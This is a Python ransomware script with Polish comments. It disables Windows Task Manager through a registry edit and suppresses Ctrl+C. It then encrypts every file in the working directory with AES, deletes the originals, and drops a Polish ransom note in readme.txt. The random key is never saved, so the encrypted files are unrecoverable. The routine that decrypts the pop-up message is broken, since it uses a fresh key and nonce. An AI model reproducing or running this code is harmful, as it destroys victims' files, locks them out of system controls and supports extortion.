import ctypes
from Crypto.Cipher import AES
import os
import random
import string
import subprocess
import sys
import msvcrt

def disable_task_manager():
    try:
        subprocess.run(["REG", "ADD", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], check=True)
    except subprocess.CalledProcessError:
        pass

def disable_ctrl_c():
    ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)

def show_info_window(key):
    cipher = AES.new(key.encode('utf-8'), AES.MODE_EAX)
    encrypted_message = b'\xd9\x04+\x04\x1f\xcc\xd2\x8d\xff\xc6\xd0T\xfd&\x95E\xa0\x99k\x1f\xeb\x05\xbf\x0eA\xc2\x9fG\xd9\x1d'  # Zaszyfrowana wiadomość
    decrypted_message = cipher.decrypt(encrypted_message)
    ctypes.windll.user32.MessageBoxW(0, decrypted_message.decode('utf-8'), "Uwaga!", 1)

def generate_aes_key():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # Klucz AES o długości 32 bajtów

def encrypt_file(filename, key):
    cipher = AES.new(key.encode('utf-8'), AES.MODE_EAX)
    with open(filename, 'rb') as file:
        plaintext = file.read()
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(filename + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(cipher.nonce + tag + ciphertext)
    os.remove(filename)  # Usuń oryginalny plik

def ransom_note():
    return "Twoje pliki zostały zaszyfrowane. Wprowadź prawidłowy kod, aby odzyskać dostęp."

def main():
    key = generate_aes_key()
    show_info_window(key)
    disable_task_manager()
    disable_ctrl_c()

    files_to_encrypt = [filename for filename in os.listdir() if os.path.isfile(filename)]

    for filename in files_to_encrypt:
        encrypt_file(filename, key)

    with open('readme.txt', 'w') as ransom_note_file:
        ransom_note_file.write(ransom_note())

if __name__ == "__main__":
    main()
